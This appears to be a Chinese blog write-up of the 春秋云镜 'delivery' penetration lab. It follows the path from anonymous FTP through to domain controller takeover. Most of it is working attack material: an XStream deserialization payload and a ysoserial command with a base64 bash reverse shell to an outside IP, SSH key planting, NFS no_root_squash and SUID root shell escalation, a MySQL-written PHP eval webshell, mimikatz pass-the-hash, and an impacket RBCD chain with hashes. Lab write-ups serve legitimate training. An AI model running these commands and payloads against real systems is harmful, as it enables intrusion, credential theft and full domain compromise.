---
title: "春秋云镜 delivery"
onlyTitle: true
date: 2025-8-14 22:08:17
categories:
- 渗透
- 春秋云镜
tags:
- 春秋云镜
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8167.jpg

---



## delivery

### flag1

fscan扫描，开了21端口，账号anonymous，开放了1.txt和pom.xml

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250825202106472.png)

ftp连接

![S](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoratyporaimage-20250825202329192.png)

```shell
get pom.xml
```

下载pom.xml

1.txt下下来啥也没有，pom.xml下下来如下，看到是一个springboot起的java程序，有xstream依赖和CC3.2.1依赖

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>2.7.2</version>
        <relativePath/> <!-- lookup parent from repository -->
    </parent>
    <groupId>com.example</groupId>
    <artifactId>ezjava</artifactId>
    <version>0.0.1-SNAPSHOT</version>
    <name>ezjava</name>
    <description>ezjava</description>
    <properties>
        <java.version>1.8</java.version>
    </properties>
    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-thymeleaf</artifactId>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>

        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-test</artifactId>
            <scope>test</scope>
        </dependency>

        <dependency>
            <groupId>com.thoughtworks.xstream</groupId>
            <artifactId>xstream</artifactId>
            <version>1.4.16</version>
        </dependency>

        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.2.1</version>
        </dependency>
    </dependencies>

    <build>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
            </plugin>
        </plugins>
    </build>

</project>

```

访问80端口是Ubuntu默认页面，没什么业务，没办法入手

访问8080端口发现一个发货后台，随便填点东西提交，发现post数据为xml格式

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250825202920892.png)

直接打XStream反序列化

网上一搜就能搜到1.4.16XStream反序列化的payload，之前复现的时候记得XStream的poc就挂在官网上

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250825203544229.png)

一看poc的地址和InitialContext就知道是打JNDI，不过官网这吊毛poc不能用，得用下面这个Poc

```java
<java.util.PriorityQueue serialization='custom'>
    <unserializable-parents/>
    <java.util.PriorityQueue>
        <default>
            <size>2</size>
        </default>
        <int>3</int>
        <javax.naming.ldap.Rdn_-RdnEntry>
            <type>12345</type>
            <value class='com.sun.org.apache.xpath.internal.objects.XString'>
                <m__obj class='string'>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content</m__obj>
            </value>
        </javax.naming.ldap.Rdn_-RdnEntry>
        <javax.naming.ldap.Rdn_-RdnEntry>
            <type>12345</type>
            <value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'>
                <message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>
                    <parsedMessage>true</parsedMessage>
                    <soapVersion>SOAP_11</soapVersion>
                    <bodyParts/>
                    <sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>
                        <attachmentsInitialized>false</attachmentsInitialized>
                        <nullIter class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>
                            <aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'>
                                <candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'>
                                    <names>
                                        <string>aa</string>
                                        <string>aa</string>
                                    </names>
                                    <ctx>
                                        <environment/>
                                        <registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'>
                                            <java.rmi.server.RemoteObject>
                                                <string>UnicastRef</string>
                                                <string>117.72.74.197</string>
                                                <int>1999</int>
                                                <long>0</long>
                                                <int>0</int>
                                                <long>0</long>
                                                <short>0</short>
                                                <boolean>false</boolean>
                                            </java.rmi.server.RemoteObject>
                                        </registry>
                                        <host>117.72.74.197</host>
                                        <port>1999</port>
                                    </ctx>
                                </candidates>
                            </aliases>
                        </nullIter>
                    </sm>
                </message>
            </value>
        </javax.naming.ldap.Rdn_-RdnEntry>
    </java.util.PriorityQueue>
</java.util.PriorityQueue>
```

修改JNDI地址，我这里本来想用yakit执行命令，但是生成的时候必须要有类名，翻了一下源码，发现字段只有host和port，没有类名，属于是只能打rmi，不能打ldap，也许下面的Reference可以赋值？

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250825210312029.png)

虽然有reference，但是漏洞的执行点是位于UnicastRef.readExternal，因为XStream会自动触发继承了Serializable接口的反序列化方法，是在LiveRef read完成最后的rmi访问，所以修改外部的reference是没有屌用的（已测试）

https://cn-sec.com/archives/396386.html

只能用yso了，再一个说来yso的JRMPListener的实现原理是打rmi反序列化，看下源码

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250825214800792.png)

为什么yso的打RMI生成的链接直接就是一个rmi://ip:port，而没有后面的类名？众所周知rmi必须要有类绑定

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250825215143060.png)

另外，为什么`<string>UnicastRef</string>`与其他是平级的？按理说应该长这样：

```xml
<java.rmi.server.RemoteObject>
  <ref class="java.rmi.server.UnicastRef">
    <host>115.236.153.170</host>
    <port>30924</port>
    ...
  </ref>
</java.rmi.server.RemoteObject>

```

那是 **基于 `XStream` 自定义 alias/mapper 的序列化风格**。
 在 **默认风格** 下，XStream 为了节省 XML 层级，直接把类型名和字段值平铺在最外层。

mad，下次还是写好java payload再用XStream序列化成xml吧，格式太乱了

另外

- `sun.rmi.transport.LiveRef` **底层只包含**：
  - 一个 `TCPEndpoint`（里面有 host 和 port）
  - 一个 `ObjID`（标识远程对象）
  - 一个 `isLocal` 标志

它的 **协议格式是固定的**，写出的时候走的就是 `TCPEndpoint.write()` 或 `writeHostPortFormat()`，不会携带想拼接的 `/evilclass` 路径，真正带路径的远程加载发生在 **JNDI Reference / URLClassLoader** 相关的 gadget

泪目

下载yso中....总算知道了yso不可被yakit和marshalsec替代的部分，rmi<8u121，不能携带类名时，必须用yso

u1s1 yakit用多了真不想用yso一根

```shell
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1999 CommonsCollections6 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTUuMjM2LjE1My4xNzAvMjg5OTggMD4mMQ==}|{base64,-d}|{bash,-i}"
```

我草，我花生壳弹了半天没弹回来，终于意识到了rmi不是tcp！花生壳tcp映射根本回不来,nima

vps yso 117.72.74.197，nc 115.236.153.174

也是成功弹回shell，直接就是root权限，拿到flag1

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250828203322789.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250828203511142.png)

### flag2

直接在/root/.ssh/authorized_keys写ssh公钥，连上

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250828205142632.png)

内网网段172.22.13.14/24

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250828205413910.png)

传fscan扫内网

./FScan_linux_x64 -h 172.22.13.14/24

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250828205642504.png)

扫到4个主机28，14，57，6，本机是14

总结一下信息：DC主机6，28主机Win Server 2016

我再一次的没扫出28的弱口令，hh我的垃圾fscan，别人那看到的28有mysql弱口令root 123456

靶机提示NFS，copy一段NFS的知识：

>### nfs提权
>
>> 网络文件系统（**NFS**）是一个客户端 / 服务器应用程序，它使计算机用户可以查看和选择存储和更新远程计算机上的文件，就像它们位于用户自己的计算机上一样。在 **NFS** 协议是几个分布式文件系统标准，网络附加存储（NAS）之一。
>
>> NFS 是基于 UDP/IP 协议的应用，其实现主要是采用远程过程调用 RPC 机制，RPC  提供了一组与机器、操作系统以及低层传送协议无关的存取远程文件的操作。RPC 采用了 XDR 的支持。XDR  是一种与机器无关的数据描述编码的协议，他以独立与任意机器体系结构的格式对网上传送的数据进行编码和解码，支持在异构系统之间数据的传送。
>
>利用先遣条件：`no_root_squash`选项得开启
>
>1. 识别nfs共享，可以利用nmap工具或rpcinfo等工具
>
>  ```sh
>  nmap -sV -p111,2049 IP
>  #nmap扫描nfs的常用端口111和2049
>  rpcinfo -p 192.168.1.171
>  #rpcinfo直接枚举nfs
>  ```
>
>2. - 检查nfs配置文件`/etc/exports`，检查开启的nsf共享目录和`no_root_squash`选项设置
>
>  - 利用metasploit或showmount列举目标主机的可用nfs exports
>
>    ```sh
>    msf > use auxiliary/scanner/nfs/nfsmount
>    msf auxiliary(nfsmount) > set rhosts IP
>    msf auxiliary(nfsmount) > run
>    ```
>
>    ```sh
>    showmount -e IP
>    ```
>
>3. 挂载nfs exports
>
>```sh
>sudo mount -o [options] -t nfs ip_address:share directory_to_mount
>```

nfs的常用端口111和2049

fscan扫下谁开了这两个端口

./FScan_linux_x64 -h 172.22.13.14/24 -p 111,2049

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250828210621180.png)

57主机开了111和2049

查看可用的nfs exports/nfs共享目录：

showmount -e 172.22.13.57

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250828213350221.png)

看到是在/home/joyce下共享

系统统没有 NFS 客户端工具，先下载nfs-common，然后去挂载nfs exports到temp目录

```cobol
sudo apt update
sudo apt install -y nfs-common
mkdir godown
mount -t nfs 172.22.13.57:/ ./godown -o nolock
```

mount | grep home查看挂载目录的权限，为rw 读写权限

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250828221047403.png)

下面会尝试写ssh去连57，在此之前得穿下内网，依旧是gost，穿完配下profixier

```sh
./gost -L socks5://:5555?bind=true

gost -L rtcp://:2222/39.99.144.203:22 -F socks5://39.99.144.203:5555
```

写ssh公钥

```shell
cd /root/godown/home/joyce
mkdir .ssh
cd .ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAgEAyMKDIbTdKecWjhOxfm/C6bkR8WuABeqUAacyD8DJGfA7UaKQbvIZxagSrQ7X+jOPJYDwoe3HKoG0uH987EmsHMS1FLYgHIrGzinvta4AlMFCS3r8OF/49iGvcZnqxD5UNd9DRBlu4jIu6FDl+lYyebFDfjCoRn2hcin8oxXNLbo1X95B6xqaokrnFz9H57GzrqfwN6lVy46ophmtmcLqlIIMByt2wxEdaVFWrxHYVNmvMUfHOg9KJ+aqKmPIbLLSSknAeW7YOB1o86wq36vUv5nYQqol1mAlCtYYSJrNd2RRN43ikRqbQb4l5h1S1GJmYQ8hMJWhlia19waYGiSutKBjpVggEKS00Btku5xwStOraCOJqDiSNTQw//XjL/0oCeZtsrCLmPblgeLg1i7QBrTif3jQ+3UNC1DWj7+NXdmaEAeLWH1vVu7K0JzN3yMKM9ywoZQClGVv6F+aHS5HwxjKdCQPy86eG+rSmOy+RgpYjX4leqg3sb2a4Ys9oNt7/bQChABxnGfi8l48Su+nQhW1orks9sdZM9qhem90fkpqFDxt1pv6Q8J8C+8kIjXg/FmZ4qp8+d8InDqhhNbDLdAkQX1o9Iocg2XHSAtDNUHUZtNCT2AcmAH61qGkOHAe6dvXEVA9HRxF5oElnyAQ87z4Hbo2wW7CCPBbXNkjQIk= rsa 4096-20250810" >> authorized_keys
```

妈的真就死活连不上，第二次打秒连通，可能是之前别人打的把ssh搞出问题了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250829154922196.png)

xshell链上去是joyce用户

提权，直接上nfs脚本，看先知好像msf也可以？

https://gist.github.com/zkryakgul/bb561235b7f36c57d15a015d20c7e336

还有一个ftp提权，因为查找suid权限命令找到ftp，那肯定可以ftp把flag文件传出来。这里略过了，看nfs提权吧

倒数第二行加个注释

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250828211213485.png)

在靶机1的joyce目录下上传运行后，如果靶机上没有`nfs-common`，需要安装

```shell
apt update
apt-get install nfs-common -y
```

重新运行后也是没报错了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250828215551000.png)

然后依旧是在靶机1的joyce目录下，生成一个 SUID root Shell

```sh
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > root.c
gcc root.c -o root
chmod +s root
```

程序调用 `setuid(0)`、`setgid(0)`，将有效 UID/GID 设置为 0。

调用 `system("/bin/bash")` 启动一个 shell。

因为有效 UID 是 0，这个 shell 就是 **root 权限**。

然后去靶机2的pwd home/joyce下运行`./root`即可提权

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250829160252376.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250829160405517.png)

flag02: flag{71f6de46-64aa-4e45-9702-cb40bb07049d}

### flag3

172.22.13.28

打28的mysql弱口令root 123456，navicat链接(有点慢啊)

下面是mysql写webshell的姿势

```sh
show variables like "secure_file_priv";
# secure_file_priv为NULL时，可以写文件

show variables like "%datadir%"
# 查看数据库data的绝对路径，发现MySQL在phpstudy目录下

select "<?php eval($_POST[1]);?>" into outfile "C:/phpstudy_pro/WWW/1.php";
# 向phpstudy WWW下写webshell

```

>## MySQL 写webshell所需权限
>
>通常至少需要以下权限之一：
>
>1. **`FILE` 权限**
>
>   - 允许用户使用 `SELECT ... INTO OUTFILE`、`LOAD DATA INFILE` 等语句在数据库服务器上读写文件。
>
>   - 常见写入 WebShell 的方式：
>
>     ```
>     SELECT '<?php @eval($_POST["cmd"]); ?>' 
>     INTO OUTFILE '/var/www/html/shell.php';
>     ```
>
>如果数据库用户有 `FILE` 权限，就可以直接写文件。
>
>即使没有 `FILE` 权限，但能结合 `secure_file_priv` 设置绕过（比如导出到允许目录）。
>
>即便有 `FILE` 权限，还需要满足以下条件才能写成功：
>
>**`secure_file_priv` 配置**
>
>- MySQL 参数 `secure_file_priv` 限制了 `INTO OUTFILE` 写文件的目录。
>- 如果设置为空（`secure_file_priv=''`），表示禁用导出文件功能。
>- 如果设置了特定路径，你只能写到那个目录，可能不是 Web 目录。
>
>**Web 目录权限**
>
>- MySQL 进程用户（如 `mysql` 用户）必须对 Web 目录有写权限，否则写不进去。

mysql在phpstudy，代表可访问phpstudy目录，大概率也能访问WWW目录

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250829161727146.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250829161940382.png)

然后随便找个webshell工具直接连，连上发现是system权限

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250829162305150.png)

先找到flag3

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250829162343777.png)

flag03: flag{43271db9-af74-4b4f-8560-1eec738f52ea} 

### flag4

flag2的位置比较奇怪，因为云镜的flag在linux的位置一般都是/root/flag/下对吧，这个flag却在根目录下，找flag的同时也找到了pAss.txt

发现一个域账户 xiaorang.lab/zhangwen\QT62f3gBhK1

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250829162540572.png)

在28，也就是蚁剑shell上添加用户，然后rdp

net user godown qwerQ!1234 /add

net localgroup administrators godown /add

上传mimikatz抓密码，这就体现了rdp的作用了，这里必须管理员cmd，进mimikatz交互shell才能抓到

抓到HAUWOLAO的NTLM b2bd510578233780e6bab1154142c33a

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250829164742131.png)

还有chenglei的

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250829164847170.png)

`sekurlsa::pth`是Mimikatz 的模块，用来执行 **Pass-the-Hash**（利用 NTLM 哈希而不是明文密码进行身份验证）。

用户有两个，还有很多服务，看着头疼，上BloodHound

先用SharpHound收集

https://github.com/SpecterOps/SharpHound/releases

SharpHound有两个版本，分别对应执行如下命令即可

注意ntml每个靶机不一样，是动态的

```
mimikatz.exe "sekurlsa::pth /user:WIN-HAUWOLAO$ /domain:XIAORANG.LAB /ntlm:b2bd510578233780e6bab1154142c33a" exit
```

```sh
# 二进制采集工具命令：
SharpHound.exe -c all
# powershell采集工具命令：
powershell -exec bypass -command "Import-Module ./SharpHound.ps1; Invoke-BloodHound -c all"
```

随便挑一个执行后，发现都是Unable，我也懒得试版本了，觉得无聊的时候跑了一下这个![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250829172908532.png)

net user chenglei /domain看下本机和chenglei在域的关系，为什么我这里在rdp不能执行在蚁剑能执行，因为用户不一样吗？但我不是已经把godown加入administor组了？

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250829172609414.png)

于是我在蚁剑运行SharpHound，您猜怎么着？真行了，不过得等一会儿

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250829172845582.png)

应该是system在域中有另外的权限可以访问ldap服务器？而新加的没有

不管怎么的，有了bloodhound.zip，嗯，那为什么我2.7和1.1版本收集到的都不能导入？

操我真麻了，不搞了

看到chenglei在ACL admin里面

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250829172609414.png)

这里也是记住了，大概率nt system才能SharpHound，虽然没有验证

可以打`DCSync`或`RBCD`

#### RBCD

还好TMD的只剩一个6号机器了，chenglei就在6号

要不然得搭二层代理，代理进28才能进域环境打，现在只用一层代理进内网就能打6号。

（中间我还试了一下二层代理，结果在28上跑gost直接报错崩溃，有点意思

我这里没下impacket的py，为了偷懒只打了RBCD

```sh
sudo vi /etc/proxychains4.conf
socks5 xxxx 5555

proxychains4 -q impacket-addcomputer "xiaorang.lab/chenglei" -hashes :0c00801c30594a1b8eaa889d237c5382 -computer-name 'godown$' -computer-pass 'whoami@123' -dc-ip 172.22.13.6

# 票据传递利用chenglei用户的权限去向6机器添加godown用户

proxychains4 -q impacket-rbcd "xiaorang.lab/chenglei" -hashes :0c00801c30594a1b8eaa889d237c5382 -action write -delegate-from "godown$" -delegate-to "WIN-DC$" -dc-ip 172.22.13.6

# 用impacket的rbcd poc去允许用户模拟 WIN-DC$ 上的任意用户（如域管理员）

proxychains4 -q impacket-getST xiaorang.lab/godown$:'whoami@123' -dc-ip 172.22.13.6 -spn ldap/WIN-DC.xiaorang.lab -impersonate Administrator

# 使用 impacket-getST 通过 S4U2Self 和 S4U2Proxy 协议，以 godown$ 的身份请求 Administrator 用户的 Kerberos 服务票据（TGS）
# 把对应的票据保存到了本地

export KRB5CCNAME=Administrator@ldap_WIN-DC.xiaorang.lab@XIAORANG.LAB.ccache

# 设置 Kerberos 票据缓存，这一步设置的环境变量能在上一步看到位置

```

完事了还得改下/etc/hosts，这样才能识别DC，处在域环境下

```cobol
172.22.14.6     WIN-DC.xiaorang.lab
```

然后传递票据

```shell
proxychains4 -q impacket-psexec 'xiaorang.lab/administrator@WIN-DC.xiaorang.lab' -target-ip 172.22.13.6 -codec gbk -no-pass -k
# 使用本地保存的票据去登录
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250829181719985.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250829181913236.png)

flag04: flag{95c126d4-a04d-402b-854f-3cb209244a4b}





### 附一个BloodHound的安装

BloodHound win下载

https://github.com/SpecterOps/BloodHound-Legacy/releases/tag/v4.3.1

BloodHound登录一直转圈，翻找issue中...

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250829092444613.png)

https://github.com/SpecterOps/BloodHound-Legacy/issues/496

ctrl shift I查看控制台，发现neo4j的版本不合法

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250829102200531.png)

说明neo4j新版不在BloodHound识别库里面

之所以kali上的能用，也是因为kali上的neo4j版本比较老吧

因为下的bloodhound是2023年发，选个最老的neo4j数据库，成功登录

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250829104747550.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250829104815887.png)





我的问题：

Administrator组和nt system的区别
